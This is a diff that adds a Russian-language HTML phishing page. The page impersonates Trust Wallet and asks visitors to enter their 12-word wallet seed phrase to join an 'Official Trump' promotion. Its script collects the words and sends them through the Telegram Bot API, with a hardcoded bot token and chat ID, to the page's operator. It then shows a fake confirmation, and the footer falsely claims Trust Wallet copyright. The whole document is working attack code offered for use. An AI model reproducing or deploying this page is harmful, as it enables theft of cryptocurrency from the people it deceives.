@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Авторизация кошелька</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #0B0E11;
+            color: #FFFFFF;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            flex-direction: column;
+            overflow-x: hidden;
+            height: 100%;
+        }
+        .container {
+            max-width: 450px;
+            width: 100%;
+            background-color: #1E1E1E;
+            border-radius: 16px;
+            padding: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            margin-bottom: 50px;
+            overflow-y: auto;
+            padding-bottom: 60px;
+            box-sizing: border-box;
+            flex: 1; /* Контейнер будет занимать все доступное пространство */
+        }
+        .logo {
+            margin-bottom: 16px;
+        }
+        .logo img {
+            width: 300px;
+            height: auto;
+        }
+        h1 {
+            font-size: 20px;
+            margin-bottom: 16px;
+            margin-top: 30px;
+        }
+        .description {
+            font-size: 14px;
+            color: #A0A0A0;
+            margin-bottom: 20px;
+        }
+        .seed-input {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .seed-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .seed-item label {
+            font-size: 14px;
+            color: #A0A0A0;
+            font-weight: bold;
+            width: 25px;
+            text-align: center;
+        }
+        input {
+            padding: 8px;
+            font-size: 14px;
+            border: 1px solid #333333;
+            border-radius: 6px;
+            background-color: #2C2C2C;
+            color: #FFFFFF;
+            width: 100%;
+            box-sizing: border-box;
+            transition: none;
+        }
+        input::placeholder {
+            color: #888888;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1C86EE;
+        }
+        button {
+            margin-top: 20px;
+            width: 100%;
+            max-width: 270px; /* Сделано немного шире */
+            padding: 14px;
+            background-color: #122fe6;
+            color: #FFFFFF;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 50px; /* Сделаны углы более круглыми */
+            cursor: pointer;
+            transition: background-color 0.3s;
+            align-self: center;
+        }
+        button:hover {
+            background-color: #122fe6;
+        }
+        .warning {
+            margin-top: 10px;
+            font-size: 12px;
+            color: #FFD700;
+            text-align: center;
+        }
+        footer {
+            width: 100%;
+            background-color: #1E1E1E;
+            text-align: center;
+            font-size: 12px;
+            color: #A0A0A0;
+            padding: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="IMG_2134.png" alt="Trust Wallet Logo">
+        </div>
+        <h1>Для участия в акции Official Trump авторизируйте свой кошелёк</h1>
+        <p class="description">Введите вашу seed-фразу из 12 слов, чтобы подтвердить участие в акции.</p>
+        <form id="seedForm">
+            <div class="seed-input">
+                <div class="seed-item">
+                    <label for="word1">1.</label>
+                    <input type="text" id="word1" name="word1" placeholder="Seed-фраза" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word2">2.</label>
+                    <input type="text" id="word2" name="word2" placeholder="Seed-фраза" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word3">3.</label>
+                    <input type="text" id="word3" name="word3" placeholder="Seed-фраза" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word4">4.</label>
+                    <input type="text" id="word4" name="word4" placeholder="Seed-фраза" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word5">5.</label>
+                    <input type="text" id="word5" name="word5" placeholder="Seed-фраза" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word6">6.</label>
+                    <input type="text" id="word6" name="word6" placeholder="Seed-фраза" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word7">7.</label>
+                    <input type="text" id="word7" name="word7" placeholder="Seed-фраза" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word8">8.</label>
+                    <input type="text" id="word8" name="word8" placeholder="Seed-фраза" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word9">9.</label>
+                    <input type="text" id="word9" name="word9" placeholder="Seed-фраза" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word10">10.</label>
+                    <input type="text" id="word10" name="word10" placeholder="Seed-фраза" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word11">11.</label>
+                    <input type="text" id="word11" name="word11" placeholder="Seed-фраза" inputmode="text" autocapitalize="none" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word12">12.</label>
+                    <input type="text" id="word12" name="word12" placeholder="Seed-фраза" inputmode="text" autocapitalize="none" required>
+                </div>
+            </div>
+            <button type="submit">Подтвердить кошелёк</button>
+        </form>
+        <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
+    </div>
+
+    <script>
+        document.getElementById('seedForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const words = [];
+            for (let i = 1; i <= 12; i++) {
+                words.push(document.getElementById(`word${i}`).value.trim());
+            }
+
+            if (words.length === 12 && words.every(word => word)) {
+                const message = words.map((word, index) => `${index + 1}. ${word}`).join('\n');
+                const chatId = '@seed_phrase173737_bot';  // Ваш чат ID
+                const token = '7804666257:AAHa9XgzVNYW5mT5Rkfl9vqloaELZYlEJY4';  // Ваш токен бота
+                const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+                fetch(url)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            alert('Кошелёк успешно отправлен на проверку, и будет участвовать в акции если подходит по критериям.');
+                        } else {
+                            alert('Ошибка отправки.');
+                        }
+                    })
+                    .catch(error => {
+                        alert('Ошибка отправки.');
+                    });
+            } else {
+                alert('Пожалуйста, заполните все поля по порядку.');
+            }
+        });
+    </script>
+
+    <footer>
+        © 2025 Trust Wallet. Все права защищены.
+    </footer>
+</body>
+</html>
